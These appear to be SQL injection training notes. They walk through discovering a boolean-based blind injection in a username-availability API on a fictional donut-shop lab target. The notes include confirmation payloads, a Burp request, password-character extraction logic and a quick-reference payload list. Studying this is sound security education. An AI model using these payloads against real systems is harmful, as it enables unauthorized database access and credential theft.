# 🔎 Identifying Boolean-based SQLi

## Scenario

**Target**: Aunt Maria's Donuts - Business website  
**Scope**: External attacker simulation (no credentials)

---

## Reconnaissance

### Registration Page Discovery

Navigate to signup page and observe behavior:

```
http://<TARGET>/signup.php
```

When entering username, notice:
> "The username 'moody' is **available**"

This suggests **database query** to check username existence.

---

## Investigating Username Check

### Source Code Analysis

**Step 1**: View page source

```html
<input id="usernameInput" onfocusout="checkUsername()" ...>
```

The `onfocusout` event triggers `checkUsername()` when user leaves field.

**Step 2**: Find JavaScript reference

```html
<script src="static/js/signup.js"></script>
```

**Step 3**: Analyze `signup.js`

```javascript
function checkUsername() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            var json = JSON.parse(xhr.responseText);
            var username = document.getElementById("usernameInput").value;
            
            if (json['status'] === 'available') {
                usernameHelp.innerHTML = "The username '" + username + "' is available";
            } else {
                usernameHelp.innerHTML = "The username '" + username + "' is taken";
            }
        }
    };
    xhr.open("GET", "/api/check-username.php?u=" + 
        document.getElementById("usernameInput").value, true);
    xhr.send();
}
```

### Key Findings

| Element | Value |
|---------|-------|
| **Endpoint** | `/api/check-username.php?u=<username>` |
| **Method** | GET |
| **Response** | `{"status": "available"}` or `{"status": "taken"}` |

---

## Testing for SQLi

### Initial Probing

| Username | Response |
|----------|----------|
| `admin` | `status: taken` |
| `maria` | `status: taken` |
| `'` | **500 Internal Server Error** ⚠️ |

Single quote causes error = **potential SQLi!**

### Backend Query (Assumed)

```sql
SELECT Username FROM Users WHERE Username = '<u>'
```

With `'` input:

```sql
SELECT Username FROM Users WHERE Username = '''
-- Syntax error!
```

---

## Confirming Boolean-based SQLi

### Injection Test

**Payload**: `' or '1'='1`

**Resulting Query**:

```sql
SELECT Username FROM Users WHERE Username = '' or '1'='1'
```

Since `'1'='1'` is always true → query returns rows → `status: taken`

### Burp Suite Test

```http
GET /api/check-username.php?u=%27%20or%20%271%27%3D%271 HTTP/1.1
Host: <TARGET>
```

**Response**:

```json
{"status": "taken"}
```

### Confirmation Matrix

| Payload | Expected | Reason |
|---------|----------|--------|
| `' or '1'='1` | `taken` | Always true |
| `' and '1'='2` | `available` | Always false |
| `' or '1'='2` | `available` | False condition |
| `' and '1'='1` | Depends on base | True but empty base |

---

## What We Know

### Vulnerability Confirmed

✅ **Boolean-based Blind SQL Injection**

### Oracle Responses

| Response | Meaning |
|----------|---------|
| `status: taken` | Query returned rows (TRUE) |
| `status: available` | Query returned nothing (FALSE) |

### Limitations

- ❌ No direct data output
- ❌ No error messages with data
- ✅ Can ask "Yes/No" questions
- ✅ Can infer data bit by bit

---

## Attack Strategy

```
1. Confirm injection point ✅
2. Determine database type
3. Enumerate database structure
4. Extract data using conditional queries
```

### Example Extraction Logic

```sql
-- Is first character of password 'a'?
' or SUBSTRING(password,1,1)='a' and '1'='1

-- Response: taken = YES, available = NO
```

---

## Next Steps

- [Boolean-based Exploitation](boolean-based-exploitation.md) - Data extraction techniques
- [Writing Custom Scripts](custom-scripts.md) - Automating extraction

---

## Quick Reference

### Common Boolean Payloads

```sql
-- Always True
' or '1'='1
' or 1=1--
' or 'a'='a

-- Always False  
' and '1'='2
' and 1=2--
' and 'a'='b

-- Conditional
' and SUBSTRING(@@version,1,1)='M'--
' and (SELECT COUNT(*) FROM users)>0--
```

### URL Encoding

| Character | Encoded |
|-----------|---------|
| `'` | `%27` |
| ` ` (space) | `%20` |
| `=` | `%3D` |
| `--` | `%2D%2D` |

